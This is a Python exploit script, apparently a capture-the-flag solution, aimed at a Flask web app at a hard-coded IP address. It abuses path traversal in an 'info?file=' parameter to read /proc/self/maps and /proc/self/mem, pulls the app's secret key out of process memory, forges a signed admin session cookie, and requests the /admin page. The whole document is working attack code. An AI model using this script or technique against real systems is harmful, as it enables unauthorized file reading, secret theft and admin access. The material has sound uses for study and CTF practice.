# coding=utf-8
#----------------------------------
###################################
#Edited by lx56@blog.lxscloud.top
###################################
#----------------------------------
import requests
import re
import ast, sys
from abc import ABC
from flask.sessions import SecureCookieSessionInterface


url = "http://61.147.171.105:59411/"

#此程序只能运行于Python3以上
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')

#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key
        
class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            #Encode a Flask session cookie
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
#-------------------------------------------



#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key
s_key = ""
bypass = "../.."
#请求file路由进行读取
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    #匹配指定格式的地址
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)
        
        #设置起始和结束位置并读取/proc/self/mem
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        #用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey
        if "*abcdefgh" in res.text:
            #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh
            secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Secret Key:", secret_key[0])
                s_key = secret_key[0]
                break

#设置session中admin的值为1
data = '{"admin":1}'
#伪造session
headers = {
    "Cookie" : "session=" + FSCM.encode(s_key, data)
}
#请求admin路由
try:
    flag = requests.get(url + "admin", headers=headers)
    print("Flag is", flag.text)
except:
    print("Something error")
